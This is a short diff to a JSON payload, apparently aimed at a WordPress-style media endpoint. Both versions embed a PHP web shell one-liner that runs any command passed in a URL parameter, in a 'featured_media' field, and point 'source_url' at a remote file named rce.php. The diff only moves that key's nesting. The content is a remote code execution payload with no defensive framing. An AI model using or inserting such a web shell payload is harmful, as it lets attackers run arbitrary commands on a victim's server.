@@ -1,1 +1,1 @@
-{"0":{"featured_media":"<?php system($_GET['cmd']);?>","source_url":"https://raw.githubusercontent.com/joaopedrosalcantara/joaopedrosalcantara.github.io/refs/heads/main/rce.php","title":{"rendered":"titlerce4"}}}
+{"0":{"featured_media":"<?php system($_GET['cmd']);?>","title":{"rendered":"titlerce4"}},"source_url":"https://raw.githubusercontent.com/joaopedrosalcantara/joaopedrosalcantara.github.io/refs/heads/main/rce.php"}
